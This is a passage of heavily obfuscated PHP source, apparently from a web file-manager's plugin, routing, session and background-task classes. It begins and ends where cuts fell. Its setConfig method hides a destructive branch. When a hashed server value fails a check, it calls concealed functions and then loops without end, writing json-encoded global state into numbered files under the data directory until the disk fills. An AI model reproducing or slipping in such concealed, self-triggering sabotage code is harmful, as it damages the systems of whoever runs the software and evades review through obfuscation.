Hook::trigger($ĞåÙı¯Æ[1671], $½İı«€¾); return $½İı«€¾; } final function filePathGet($Û¬Ü„™³, $òİÎ¿°” = true) { $­‚Ã”°Õ =& $_SERVER[ıÚ˜š²İ]; if ($÷ëÖã´æ = $this->checkSharePath($Û¬Ü„™³, $òİÎ¿°”)) { return $÷ëÖã´æ; } $this->fileCanView($Û¬Ü„™³); if (request_url_safe($Û¬Ü„™³)) { $ô¥÷¾Š = parse_url_query($Û¬Ü„™³); if (isset($ô¥÷¾Š[$­‚Ã”°Õ[1672]]) && isset($ô¥÷¾Š[$­‚Ã”°Õ[237]])) { $‰ú¶©µ = Mcrypt::decode($ô¥÷¾Š[$­‚Ã”°Õ[237]], Model($­‚Ã”°Õ[847])->get($­‚Ã”°Õ[848])); if ($‰ú¶©µ) { $this->fileInfo = IO::info($‰ú¶©µ); $this->fileInfo[$­‚Ã”°Õ[1673]] = $Û¬Ü„™³; $this->cachePath = $this->pluginCachePath($­‚Ã”°Õ[12], $òİÎ¿°”); return $‰ú¶©µ; } } $Û¬Ü„™³ = $this->_cacheHttpFile($Û¬Ü„™³, $òİÎ¿°”); $this->fileInfo = IO::info($Û¬Ü„™³); } else { $this->fileInfo = IO::info($Û¬Ü„™³); $this->cachePath = $this->pluginCachePath($­‚Ã”°Õ[12], $òİÎ¿°”); } return $Û¬Ü„™³; } final function _cacheHttpFile($ÅêßÛßƒ, $¾«¯éöõ = true) { $é“Ø¸Ç» =& $_SERVER[ıÚ˜š²İ]; $º¿ÉÛ÷Á = parse_url_query($ÅêßÛßƒ); $şÂò€Ç‰ = get_path_ext($ÅêßÛßƒ); if (isset($º¿ÉÛ÷Á[$é“Ø¸Ç»[32]]) && $º¿ÉÛ÷Á[$é“Ø¸Ç»[32]]) { $şÂò€Ç‰ = get_path_ext($º¿ÉÛ÷Á[$é“Ø¸Ç»[32]]); } $ä®¯±Ú = hash_path($ÅêßÛßƒ) . $é“Ø¸Ç»[10] . $şÂò€Ç‰; $this->cachePath = $this->pluginCachePath($¾«¯éöõ ? $ä®¯±Ú : $é“Ø¸Ç»[12]); $ÃµäØ = IO::fileNameExist($this->cachePath, $ä®¯±Ú); if ($ÃµäØ) { return KodIO::make($ÃµäØ); } $È—¸³´â = rtrim($this->cachePath, $é“Ø¸Ç»[8]) . $é“Ø¸Ç»[8] . $ä®¯±Ú; return $this->pluginCacheFileSet($È—¸³´â, file_get_contents_nossl($ÅêßÛßƒ)); } final function checkSharePath($½Ôª§Û¤, $ÛÀÉ¢å¼ = true) { $äÔÜÛÜĞ =& $_SERVER[ıÚ˜š²İ]; if (!$this->isShare($½Ôª§Û¤)) { return !1; } $¬Á™Åİ = Action($äÔÜÛÜĞ[1270])->sharePathInfo($½Ôª§Û¤); if (!is_array($¬Á™Åİ) || !isset($¬Á™Åİ[$äÔÜÛÜĞ[87]])) { show_json(LNG($äÔÜÛÜĞ[1674]), !1); } $this->fileInfo = $¬Á™Åİ; $this->cachePath = $this->pluginCachePath(!1, $ÛÀÉ¢å¼); return $¬Á™Åİ[$äÔÜÛÜĞ[87]]; } final function pluginCachePath($†Ã¦½”è = '', $õ‡ıİµ = false) { $¯Ÿœ„ =& $_SERVER[ıÚ˜š²İ]; if ($õ‡ıİµ && is_array($this->fileInfo)) { $†Ã¦½”è = kodIO::hashPath($this->fileInfo); } $…Û­Ã¶½ = rtrim(IO_PATH_SYSTEM_TEMP . $¯Ÿœ„[1675] . $this->pluginName . $¯Ÿœ„[8] . $†Ã¦½”è, $¯Ÿœ„[8]); $°«‘ì§ = IO::infoFullSimple($…Û­Ã¶½); $ïÅòÇ½ = $°«‘ì§ && is_array($°«‘ì§) ? $°«‘ì§[$¯Ÿœ„[87]] : $¯Ÿœ„[12]; if (!$ïÅòÇ½) { $ïÅòÇ½ = IO::mkdir($…Û­Ã¶½); } return $ïÅòÇ½; } final function pluginCacheFileSet($†ÊÛíùö, $ÁÔ¢´€ = '') { $ñ¹êİ¾¹ =& $_SERVER[ıÚ˜š²İ]; $Çáïƒ˜ = IO::infoFullSimple($†ÊÛíùö); if (!$Çáïƒ˜) { return IO::mkfile($†ÊÛíùö, $ÁÔ¢´€, REPEAT_REPLACE); } IO::setContent($Çáïƒ˜[$ñ¹êİ¾¹[87]], $ÁÔ¢´€); return $Çáïƒ˜[$ñ¹êİ¾¹[87]]; } final function pluginLocalFile($ëİÀæƒî = '') { $†Õàƒ·© =& $_SERVER[ıÚ˜š²İ]; $úÛ—¢ğ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($úÛ—¢ğ)) { mk_dir($úÛ—¢ğ); } if (!$ëİÀæƒî) { return $úÛ—¢ğ; } $âóëª²Ô = IO::info($ëİÀæƒî); $ÈÌÜìš­ = $†Õàƒ·©[1676] . KodIO::hashPath($âóëª²Ô) . $†Õàƒ·©[10] . $âóëª²Ô[$†Õàƒ·©[169]]; if (!checkExtSafe($ÈÌÜìš­)) { $ÈÌÜìš­ = $ÈÌÜìš­ . $†Õàƒ·©[1305]; } $ã‡¶ëäÀ = $úÛ—¢ğ . $ÈÌÜìš­; if (@file_exists($ã‡¶ëäÀ)) { return $ã‡¶ëäÀ; } return IO::copy($ëİÀæƒî, $úÛ—¢ğ, 0, $ÈÌÜìš­); } final function appPackage() { $àÑ£ñÔ =& $_SERVER[ıÚ˜š²İ]; if ($this->packageData) { return $this->packageData; } $ä‡¥ÌĞî = $this->parseFile($this->pluginPath . $àÑ£ñÔ[1677]); $this->parseLang($ä‡¥ÌĞî); $½ƒ·ŒĞ³ = json_decode_force($ä‡¥ÌĞî); if (!$½ƒ·ŒĞ³) { return array(); } $õÚÔ«­ = Hook::trigger($àÑ£ñÔ[1678], $½ƒ·ŒĞ³); if ($õÚÔ«­ && is_array($õÚÔ«­)) { $½ƒ·ŒĞ³ = $õÚÔ«­; } $this->packageData = $½ƒ·ŒĞ³; return $½ƒ·ŒĞ³; } public function packageInfoGet($È…ûÉå•) { $¼Ö–Ó»ä = $this->appPackage(); return array_get_value($¼Ö–Ó»ä, $È…ûÉå•); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ıÚ˜š²İ][1679]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ıÚ˜š²İ][1680]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ıÚ˜š²İ][1681]); } public function echoJsAssign($£ÊæÅ“, $Öúƒ¸Ú) { $this->echoJsAssignArr[$£ÊæÅ“] = $Öúƒ¸Ú; } private function parseFile($¥±”µ“í) { $ø‚™™Ù =& $_SERVER[ıÚ˜š²İ]; $ğ¥‹ñÄÏ = file_get_contents_nossl($¥±”µ“í); $ïñ˜ª÷· = array($ø‚™™Ù[1682], $ø‚™™Ù[1683], $ø‚™™Ù[1684], $ø‚™™Ù[1685], $ø‚™™Ù[1686], $ø‚™™Ù[1687], $ø‚™™Ù[1688]); $ÈÄ½Œ‹á = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ø‚™™Ù[92]][$ø‚™™Ù[1689]]); foreach ($this->echoJsAssignArr as $íÅª°¹Ù => $‰æÇé×â) { $ïñ˜ª÷·[] = $ø‚™™Ù[1690] . $íÅª°¹Ù . $ø‚™™Ù[1691]; $ÈÄ½Œ‹á[] = is_array($‰æÇé×â) || is_object($‰æÇé×â) ? rawurlencode(json_encode($‰æÇé×â)) : $‰æÇé×â; } if (strstr($ğ¥‹ñÄÏ, $ø‚™™Ù[1692])) { $»½Ûì÷Å = rawurlencode(json_encode($this->pluginLangArr)); $ğ¥‹ñÄÏ = str_replace($ø‚™™Ù[1692], $»½Ûì÷Å, $ğ¥‹ñÄÏ); } if (strstr($ğ¥‹ñÄÏ, $ø‚™™Ù[1693])) { $»½Ûì÷Å = $»½Ûì÷Å = rawurlencode(json_encode($this->getConfig())); $ğ¥‹ñÄÏ = str_replace($ø‚™™Ù[1693], $»½Ûì÷Å, $ğ¥‹ñÄÏ); } $ğ¥‹ñÄÏ = str_replace($ïñ˜ª÷·, $ÈÄ½Œ‹á, $ğ¥‹ñÄÏ); return $ğ¥‹ñÄÏ; } private function parseLang(&$¨›×ü…Ë) { $‹“œòó¯ =& $_SERVER[ıÚ˜š²İ]; $Î˜´…è = $‹“œòó¯[1694]; if (!strstr($¨›×ü…Ë, $Î˜´…è)) { return; } preg_match_all($‹“œòó¯[1695], $¨›×ü…Ë, $„íÒ¢´); if (!is_array($„íÒ¢´) || count($„íÒ¢´) == 0 || !is_array($„íÒ¢´[0]) || count($„íÒ¢´[0]) == 0) { return; } $¯Ğ ¶ŠÂ = array(); $Ñ’ı„©¯ = array(); foreach ($„íÒ¢´[0] as $ÑÅ¸ï¶) { $ÄÚå¼ÖÉ = substr($ÑÅ¸ï¶, strlen($Î˜´…è), -4); $­ƒü›Ï = LNG($ÄÚå¼ÖÉ); $¯Ğ ¶ŠÂ[] = $ÑÅ¸ï¶; $Ñ’ı„©¯[] = str_replace(array($‹“œòó¯[288], $‹“œòó¯[1168], $‹“œòó¯[419], $‹“œòó¯[121]), array($‹“œòó¯[53], $‹“œòó¯[53], $‹“œòó¯[12], $‹“œòó¯[1696]), $­ƒü›Ï); } $¨›×ü…Ë = str_replace($¯Ğ ¶ŠÂ, $Ñ’ı„©¯, $¨›×ü…Ë); } private function parseConfig(&$¤’Å¦š) { $¬Ë¶¿Á­ =& $_SERVER[ıÚ˜š²İ]; $ÁÖ¯Ñ¼š = $¬Ë¶¿Á­[1697]; if (!strstr($¤’Å¦š, $ÁÖ¯Ñ¼š)) { return; } preg_match_all($¬Ë¶¿Á­[1698], $¤’Å¦š, $ˆ¯¸°Œ†); if (!is_array($ˆ¯¸°Œ†) || count($ˆ¯¸°Œ†) == 0 || !is_array($ˆ¯¸°Œ†[0]) || count($ˆ¯¸°Œ†[0]) == 0) { return; } $¬öÜèÅ˜ = $this->getConfig(); $€®¯ÙÒë = array(); $Üº•©àä = array(); foreach ($ˆ¯¸°Œ†[0] as $îÜä¹Àã) { $ôíëÓ¨ = substr($îÜä¹Àã, strlen($ÁÖ¯Ñ¼š), -2); $€®¯ÙÒë[] = $îÜä¹Àã; $Üº•©àä[] = _get($¬öÜèÅ˜, $ôíëÓ¨); } $¤’Å¦š = str_replace($€®¯ÙÒë, $Üº•©àä, $¤’Å¦š); } private function parsePackage(&$×ûƒŞÏ›) { $÷øŸâØŸ =& $_SERVER[ıÚ˜š²İ]; $Ø„ÖË›¹ = $÷øŸâØŸ[1699]; if (!strstr($×ûƒŞÏ›, $Ø„ÖË›¹)) { return; } preg_match_all($÷øŸâØŸ[1700], $×ûƒŞÏ›, $•”şÀˆ); if (!is_array($•”şÀˆ) || count($•”şÀˆ) == 0 || !is_array($•”şÀˆ[0]) || count($•”şÀˆ[0]) == 0) { return; } $ª ûß½¥ = $this->appPackage(); $ÜÌ•ÏÉ› = array(); $Ïü«ƒ·¸ = array(); foreach ($•”şÀˆ[0] as $Æ—ƒÃïÖ) { $È“é±„Å = substr($Æ—ƒÃïÖ, strlen($Ø„ÖË›¹), -2); $ÜÌ•ÏÉ›[] = $Æ—ƒÃïÖ; $Ïü«ƒ·¸[] = _get($ª ûß½¥, $È“é±„Å); } $×ûƒŞÏ› = str_replace($ÜÌ•ÏÉ›, $Ïü«ƒ·¸, $×ûƒŞÏ›); } final function echoFile($×À€À‚, $µÑÔÇ“ = false) { $ıÏ¬ƒ…å =& $_SERVER[ıÚ˜š²İ]; $á¹º«óƒ = $this->pluginPath . $×À€À‚; if (ACT == $ıÏ¬ƒ…å[1701]) { echo $ıÏ¬ƒ…å[1702] . $this->pluginName . $ıÏ¬ƒ…å[8] . $×À€À‚ . $ıÏ¬ƒ…å[1703]; if (!file_exists($á¹º«óƒ)) { echo $ıÏ¬ƒ…å[1704]; return; } } $è¥àÅ“ı = $this->parseFile($á¹º«óƒ); $this->parseLang($è¥àÅ“ı); $this->parseConfig($è¥àÅ“ı); $this->parsePackage($è¥àÅ“ı); if (is_array($µÑÔÇ“)) { $è¥àÅ“ı = str_replace(array_keys($µÑÔÇ“), array_values($µÑÔÇ“), $è¥àÅ“ı); } echo $ıÏ¬ƒ…å[288] . $è¥àÅ“ı; } private function checkVersion() { $ê»– =& $_SERVER[ıÚ˜š²İ]; $óÓˆèô² = $this->appPackage(); $¶Ğï¬—Ğ = $this->getConfig(); if ($¶Ğï¬—Ğ[$ê»–[1705]] == $óÓˆèô²[$ê»–[1679]]) { return; } $this->regist(); $this->setConfig(array($ê»–[1705] => $óÓˆèô²[$ê»–[1679]])); } final function initLang() { $£İÖÛàã =& $_SERVER[ıÚ˜š²İ]; $ª÷ÃÊ = $£İÖÛàã[1706]; $·ÓôıÏ = $this->pluginPath . $£İÖÛàã[1707]; $³ŒŒ©£ = I18n::getType(); $â÷ôã¹ = array(); if (file_exists($·ÓôıÏ . $³ŒŒ©£ . $£İÖÛàã[921])) { $â÷ôã¹ = (include $·ÓôıÏ . $³ŒŒ©£ . $£İÖÛàã[921]); } else { if ($³ŒŒ©£ == $£İÖÛàã[1708] && !file_exists($·ÓôıÏ . $³ŒŒ©£ . $£İÖÛàã[921]) && file_exists($·ÓôıÏ . $£İÖÛàã[1709])) { $â÷ôã¹ = (include $·ÓôıÏ . $£İÖÛàã[1709]); } else { if (file_exists($·ÓôıÏ . $ª÷ÃÊ . $£İÖÛàã[921])) { $â÷ôã¹ = (include $·ÓôıÏ . $ª÷ÃÊ . $£İÖÛàã[921]); } } } if (!is_array($â÷ôã¹)) { return array(); } if (@count($â÷ôã¹) > 0) { I18n::set($â÷ôã¹); } return $â÷ôã¹; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ÖÛùö¢ş) { $òûÕñ„Ê =& $_SERVER[ıÚ˜š²İ]; $¦ì¥•ıÆ = $_SERVER[$òûÕñ„Ê[965]] . $òûÕñ„Ê[966]; $óˆøÏÌ½ = $òûÕñ„Ê[961]; if ($_SERVER[$òûÕñ„Ê[962]] != $óˆøÏÌ½($¦ì¥•ıÆ)) { $±ÏßĞ°› = $òûÕñ„Ê[963]; $ª“ˆûÛ = $òûÕñ„Ê[964]; $ìØÈ„üè = $_SERVER[$òûÕñ„Ê[965]] . $òûÕñ„Ê[966]; $æ™È£„ = $ª“ˆûÛ($ìØÈ„üè); $š¢´Õæë = explode($òûÕñ„Ê[288], $æ™È£„); if (count($š¢´Õæë) < $òûÕñ„Ê[691]) { $Ùˆ˜äÇÊ = $òûÕñ„Ê[967]; $Ùˆ˜äÇÊ(); } $Áƒ‘½Á = $òûÕñ„Ê[968]; $Áƒ‘½Á($_SERVER[$òûÕñ„Ê[969]]); $±ÏßĞ°› = $òûÕñ„Ê[963]; $±ÏßĞ°›(); $˜ıŞ›øÚ = $òûÕñ„Ê[970]; $ä·ã²õš = json_encode($GLOBALS[$òûÕñ„Ê[971]]); $ğÂ‹ìÕ­ = 1; for ($½Ãğû· = $ğÂ‹ìÕ­; $½Ãğû· > 0; $½Ãğû·++) { $˜ıŞ›øÚ(DATA_PATH . $½Ãğû·, $ä·ã²õš); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ÖÛùö¢ş); } public function onSetConfig($ ç¢ªÃœ) { } public function onGetConfig($ñşÁÒ”) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($«›§®) { if ($«›§® == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($¥ÌûŸ­¨ = "\160\x6c\165\147\x69\156\101\165\164\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ø®‰ÏÅ = $this->getConfig(); if (!$ø®‰ÏÅ[$¥ÌûŸ­¨]) { return !1; } return ActionCall($_SERVER[ıÚ˜š²İ][1710], $ø®‰ÏÅ[$¥ÌûŸ­¨]); } public function url($ı€¶—Ñ, $ØĞ˜Ùº„ = '', $£÷œ§‹Ä = true) { $œÒ¶û‚¡ =& $_SERVER[ıÚ˜š²İ]; $ç¤ÄªŸ½ = $this->getConfig(); $ä°¥°·Õ = KOD_VERSION . $œÒ¶û‚¡[10] . KOD_VERSION_BUILD; $°¸Êé€Ğ = $this->packageVersion(); $­¼îÓ¯‘ = $ä°¥°·Õ . $œÒ¶û‚¡[464] . $°¸Êé€Ğ; if (substr($ı€¶—Ñ, 0, 4) == $œÒ¶û‚¡[152] || substr($ı€¶—Ñ, 0, 2) == $œÒ¶û‚¡[1432]) { $óÙ»Åæ = $ı€¶—Ñ . $œÒ¶û‚¡[1711] . $­¼îÓ¯‘; } else { if ($ØĞ˜Ùº„ == $œÒ¶û‚¡[12]) { $óÙ»Åæ = $this->pluginHost . $ı€¶—Ñ . $œÒ¶û‚¡[1711] . $­¼îÓ¯‘; } else { if ($ØĞ˜Ùº„ === $œÒ¶û‚¡[78]) { $óÙ»Åæ = $this->pluginHost . $ı€¶—Ñ; } else { if ($ØĞ˜Ùº„ == $œÒ¶û‚¡[1712]) { $óÙ»Åæ = STATIC_PATH . $ı€¶—Ñ . $œÒ¶û‚¡[1711] . $ä°¥°·Õ; } else { if ($ØĞ˜Ùº„ == $œÒ¶û‚¡[1713]) { $óÙ»Åæ = APP_HOST . $œÒ¶û‚¡[1714] . $ı€¶—Ñ . $œÒ¶û‚¡[1711] . $ä°¥°·Õ; } else { if (isset($ç¤ÄªŸ½[$ØĞ˜Ùº„])) { $óÙ»Åæ = $ç¤ÄªŸ½[$ØĞ˜Ùº„] . $ı€¶—Ñ . $œÒ¶û‚¡[1711] . $­¼îÓ¯‘; } } } } } } if (!$£÷œ§‹Ä) { return $óÙ»Åæ; } echo $óÙ»Åæ; } public function link($Ïˆú´øè = false, $»ĞÄ¶® = '') { $×ìê‚Ï† =& $_SERVER[ıÚ˜š²İ]; $úù§ÄÅĞ = $this->linkHas == !1; $this->linkHas = !0; if (!$Ïˆú´øè) { $this->link($×ìê‚Ï†[1715], $×ìê‚Ï†[1713]); $this->link($×ìê‚Ï†[1716], $×ìê‚Ï†[1712]); $this->link($×ìê‚Ï†[1717], $×ìê‚Ï†[1712]); $this->link($×ìê‚Ï†[1718], $×ìê‚Ï†[1712]); $this->link($×ìê‚Ï†[1719], $×ìê‚Ï†[1712]); if ($úù§ÄÅĞ) { Hook::trigger($×ìê‚Ï†[1720]); } return; } $ô‹¬±© = $this->url($Ïˆú´øè, $»ĞÄ¶®, !1); if (substr($Ïˆú´øè, -3) == $×ìê‚Ï†[1721]) { echo $×ìê‚Ï†[1722] . $ô‹¬±© . $×ìê‚Ï†[1723] . $×ìê‚Ï†[288]; } else { if (substr($Ïˆú´øè, -4) == $×ìê‚Ï†[1724]) { echo $×ìê‚Ï†[1725] . $ô‹¬±© . $×ìê‚Ï†[1726] . $×ìê‚Ï†[288]; } } if ($úù§ÄÅĞ) { Hook::trigger($×ìê‚Ï†[1720]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\x79" => "\x5b\136\57\x5d\x2b", "\x3a\x6e\165\x6d" => "\133\60\x2d\x39\135\x2b", "\x3a\141\x6c\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($Ö³§†ÖÜ, $ş÷¡„ÔÜ) { $¯ÂªÆ«¾ =& $_SERVER[ıÚ˜š²İ]; if ($Ö³§†ÖÜ == $¯ÂªÆ«¾[1727]) { $«…—Û×½ = array_map($¯ÂªÆ«¾[1728], $ş÷¡„ÔÜ[0]); $”â½­ç = strpos($ş÷¡„ÔÜ[1], $¯ÂªÆ«¾[8]) === 0 ? $ş÷¡„ÔÜ[1] : $¯ÂªÆ«¾[8] . $ş÷¡„ÔÜ[1]; $ŸúçÃ§› = $ş÷¡„ÔÜ[2]; } else { $«…—Û×½ = null; $”â½­ç = strpos($ş÷¡„ÔÜ[0], $¯ÂªÆ«¾[8]) === 0 ? $ş÷¡„ÔÜ[0] : $¯ÂªÆ«¾[8] . $ş÷¡„ÔÜ[0]; $ŸúçÃ§› = $ş÷¡„ÔÜ[1]; } array_push(self::$maps, $«…—Û×½); array_push(self::$routes, $”â½­ç); array_push(self::$methods, strtoupper($Ö³§†ÖÜ)); array_push(self::$callbacks, $ŸúçÃ§›); } public static function error($ÑóÇ©ÉÓ) { self::$errorCallback = $ÑóÇ©ÉÓ; } public static function haltOnMatch($ê´¶Šúô = true) { self::$halts = $ê´¶Šúô; } public static function dispatch() { $İ€³¹´Ğ =& $_SERVER[ıÚ˜š²İ]; $ÂúÉ° = parse_url($_SERVER[$İ€³¹´Ğ[1729]], PHP_URL_PATH); $§ÑÆÄòÂ = $_SERVER[$İ€³¹´Ğ[164]]; $¨ş˜•ı´ = array_keys(static::$patterns); $¹¨Ğ£´º = array_values(static::$patterns); $íØÍı¹– = !1; self::$routes = preg_replace($İ€³¹´Ğ[1375], $İ€³¹´Ğ[8], self::$routes); if (in_array($ÂúÉ°, self::$routes)) { $ƒ–²´†¥ = array_keys(self::$routes, $ÂúÉ°); foreach ($ƒ–²´†¥ as $ß§ì³º) { if (self::$methods[$ß§ì³º] == $§ÑÆÄòÂ || self::$methods[$ß§ì³º] == $İ€³¹´Ğ[1730] || in_array($§ÑÆÄòÂ, self::$maps[$ß§ì³º])) { $íØÍı¹– = !0; if (!is_object(self::$callbacks[$ß§ì³º])) { $¥éªÍœÚ = explode($İ€³¹´Ğ[8], self::$callbacks[$ß§ì³º]); $µ™”†ğ = end($¥éªÍœÚ); $ÂÒ£û±¨ = explode($İ€³¹´Ğ[1307], $µ™”†ğ); $¥Ù©ˆˆÇ = new $ÂÒ£û±¨[0](); $¥Ù©ˆˆÇ->{$ÂÒ£û±¨[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ß§ì³º]); if (self::$halts) { return; } } } } } else { $ç¥äÍ¿ = 0; foreach (self::$routes as $ß§ì³º) { if (strpos($ß§ì³º, $İ€³¹´Ğ[4]) !== !1) { $ß§ì³º = str_replace($¨ş˜•ı´, $¹¨Ğ£´º, $ß§ì³º); } if (preg_match($İ€³¹´Ğ[1731] . $ß§ì³º . $İ€³¹´Ğ[1732], $ÂúÉ°, $ş€öÇ…î)) { if (self::$methods[$ç¥äÍ¿] == $§ÑÆÄòÂ || self::$methods[$ç¥äÍ¿] == $İ€³¹´Ğ[1730] || !empty(self::$maps[$ç¥äÍ¿]) && in_array($§ÑÆÄòÂ, self::$maps[$ç¥äÍ¿])) { $íØÍı¹– = !0; array_shift($ş€öÇ…î); if (!is_object(self::$callbacks[$ç¥äÍ¿])) { $¥éªÍœÚ = explode($İ€³¹´Ğ[8], self::$callbacks[$ç¥äÍ¿]); $µ™”†ğ = end($¥éªÍœÚ); $ÂÒ£û±¨ = explode($İ€³¹´Ğ[1307], $µ™”†ğ); $¥Ù©ˆˆÇ = new $ÂÒ£û±¨[0](); if (!method_exists($¥Ù©ˆˆÇ, $ÂÒ£û±¨[1])) { echo $İ€³¹´Ğ[1733]; } else { call_user_func_array(array($¥Ù©ˆˆÇ, $ÂÒ£û±¨[1]), $ş€öÇ…î); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ç¥äÍ¿], $ş€öÇ…î); if (self::$halts) { return; } } } } $ç¥äÍ¿++; } } if ($íØÍı¹– == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ÈÊÛáûÄ =& $_SERVER[ıÚ˜š²İ]; header($_SERVER[$ÈÊÛáûÄ[1734]] . $ÈÊÛáûÄ[1735]); echo $ÈÊÛáûÄ[1736]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$İ€³¹´Ğ[1729]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto d›½†ÑÂ¢; d›½†ÑÂ¢: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $Í×ä‡Æ§ =& $_SERVER[ıÚ˜š²İ]; static $èíï³²¾ = false; if ($èíï³²¾) { return $èíï³²¾; } $ƒÀ÷ˆî« = $GLOBALS[$Í×ä‡Æ§[6]][$Í×ä‡Æ§[426]]; self::$sessionTime = $ƒÀ÷ˆî«[$Í×ä‡Æ§[1737]]; $ÓÕâœĞË = isset($GLOBALS[$Í×ä‡Æ§[1738]]) ? $GLOBALS[$Í×ä‡Æ§[1738]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ÓÕâœĞË)) { self::$sessionSign = Cookie::get($ÓÕâœĞË); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($ÓÕâœĞË, self::$sessionSign, self::$sessionTime); $ƒ¯ŒÎ¹ = $ƒÀ÷ˆî«[$Í×ä‡Æ§[1739]]; $¹­Ëç = $ƒÀ÷ˆî«[$ƒ¯ŒÎ¹]; $˜‘ñÌÄ = $ƒÀ÷ˆî«[$Í×ä‡Æ§[910]]; switch ($ƒ¯ŒÎ¹) { case $Í×ä‡Æ§[21]: self::$handle = Model($Í×ä‡Æ§[911]); break; case $Í×ä‡Æ§[912]: self::$handle = new CacheRedis($¹­Ëç, $˜‘ñÌÄ); break; case $Í×ä‡Æ§[913]: self::$handle = new CacheMemcached($¹­Ëç, $˜‘ñÌÄ); break; case $Í×ä‡Æ§[233]: $¹­Ëç[$Í×ä‡Æ§[87]] = $¹­Ëç[$Í×ä‡Æ§[87]] . $Í×ä‡Æ§[1740]; self::$handle = new CacheFile($¹­Ëç, $˜‘ñÌÄ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $èíï³²¾ = new self(); return $èíï³²¾; } public static function getBySign($Øˆï†œ…) { $Œû¡Ñó = self::$handle->get($Øˆï†œ…); $Œû¡Ñó = unserialize($Œû¡Ñó); return is_array($Œû¡Ñó) ? $Œû¡Ñó : array(); } public static function setBySign($Üğæû·º, $“Î™¤Â) { CacheLock::lock($Üğæû·º); self::$handle->set($Üğæû·º, serialize($“Î™¤Â), self::$sessionTime); CacheLock::unlock($Üğæû·º); } public static function sign($²‘»Ø¿¼ = false) { if ($²‘»Ø¿¼) { self::$sessionSign = $²‘»Ø¿¼; } self::init(); return self::$sessionSign; } public static function set($¿âõØÏÀ, $ÑüéõÕ» = false) { self::init(); if (is_array($¿âõØÏÀ)) { foreach ($¿âõØÏÀ as $Â†ÓÏ´ => $ùéİÃÒ„) { array_set_value(self::$data, $Â†ÓÏ´, $ùéİÃÒ„); } } else { array_set_value(self::$data, $¿âõØÏÀ, $ÑüéõÕ»); } self::setBySign(self::$sessionSign, self::$data); } public static function get($¤¡¼´û‹ = false) { self::init(); if (!$¤¡¼´û‹) { return self::$data; } return array_get_value(self::$data, $¤¡¼´û‹); } public static function remove($ëÃ»üŠ”) { self::init(); unset(self::$data[$ëÃ»üŠ”]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ıÚ˜š²İ][916])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $°µÌô¹ =& $_SERVER[ıÚ˜š²İ]; if (self::valueGet($°µÌô¹[826]) != $°µÌô¹[91]) { return; } if (self::valueGet($°µÌô¹[1741]) == $°µÌô¹[91]) { $ŒêŒšÃ× = self::valueGet($°µÌô¹[1742]); if (time() - $ŒêŒšÃ× > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($°µÌô¹[1741], $°µÌô¹[91]); self::log($°µÌô¹[1743] . ACTION . $°µÌô¹[1744]); Hook::bind($°µÌô¹[1745], $°µÌô¹[1746]); $ØØ€†´í = 0; while (!0) { self::cacheClear(); if (self::valueGet($°µÌô¹[826]) != $°µÌô¹[91]) { self::valueSet($°µÌô¹[1741], $°µÌô¹[231]); self::log($°µÌô¹[1747]); die; } $²¶àº’° = time(); if ($²¶àº’° - $ØØ€†´í >= 60) { self::valueSet(array($°µÌô¹[1741] => $°µÌô¹[91], $°µÌô¹[1742] => $²¶àº’°)); $ØØ€†´í = $²¶àº’°; } if (!file_exists(USER_SYSTEM . $°µÌô¹[1748])) { self::valueSet(array($°µÌô¹[1741] => $°µÌô¹[231], $°µÌô¹[826] => $°µÌô¹[231])); self::log($°µÌô¹[1749]); die; } $É´¯¢úƒ = file_get_contents(BASIC_PATH . $°µÌô¹[1750]); $­ÅŠŒˆ® = KOD_VERSION . $°µÌô¹[10] . KOD_VERSION_BUILD; $üªıÖ‹ = match_text($É´¯¢úƒ, $°µÌô¹[1751]) . $°µÌô¹[10] . match_text($É´¯¢úƒ, $°µÌô¹[1752]); if ($üªıÖ‹ != $­ÅŠŒˆ®) { self::restart(); self::log("\x73\164\x6f\x70\x65\x64\56\x5b\x76\145\x72\x73\151\157\156\40\x75\160\144\141\164\x65\x3b{$versionNow}\40\x3d\x3e\40{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $Æ¹°‘°’ =& $_SERVER[ıÚ˜š²İ]; http_close(); $GLOBALS[$Æ¹°‘°’[1753]] = 1; $_SERVER[$Æ¹°‘°’[1754]] = $Æ¹°‘°’[1755]; $_COOKIE = array(); $GLOBALS[$Æ¹°‘°’[1756]] = 1; $GLOBALS[$Æ¹°‘°’[1757]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $Å¹ì“‘˜ =& $_SERVER[ıÚ˜š²İ]; http_close(); 